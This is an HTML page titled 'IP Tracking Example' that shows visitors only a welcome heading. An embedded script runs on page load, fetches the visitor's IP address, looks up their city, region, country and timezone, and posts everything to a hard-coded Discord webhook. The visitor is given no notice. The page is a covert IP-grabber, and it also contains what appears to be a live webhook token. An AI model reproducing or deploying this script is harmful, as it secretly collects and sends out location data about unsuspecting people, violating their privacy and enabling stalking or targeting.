<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Tracking Example</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }

        h1 {
            text-align: center;
        }
    </style>
</head>
<body>
    <h1>Welcome to My Website</h1>
    <script>
        // Получение IP-адреса
        async function getIP() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        }

        // Получение данных о местоположении
        async function getLocation(ip) {
            const response = await fetch(`https://ipapi.co/${ip}/json/`);
            const data = await response.json();
            return {
                ip: ip,
                country: data.country_name,
                city: data.city,
                region: data.region,
                timezone: data.timezone
            };
        }

        // Отправка данных в Discord Webhook
        async function sendToDiscord(data) {
            const webhookUrl = 'https://discord.com/api/webhooks/1327457891665580052/c_sof4T19sdW0rij8nY-6INZrz5thmsD0NDPw8IDBZltG5ujgypgZOX9_STCCTxHYTkn'; // Замените на ваш адрес прокси-сервиса для Webhook
            const message = {
                content: `IP: ${data.ip}\nCountry: ${data.country}\nCity: ${data.city}\nRegion: ${data.region}\nTimezone: ${data.timezone}`
            };

            const response = await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(message)
            });

            if (response.ok) {
                console.log('Информация успешно отправлена в Discord');
            } else {
                console.error('Ошибка при отправке данных:', response.status);
            }
        }

        // Основной процесс
        getIP()
            .then(ip => getLocation(ip))
            .then(data => sendToDiscord(data))
            .catch(err => console.error('Ошибка:', err));
    </script>
</body>
</html>
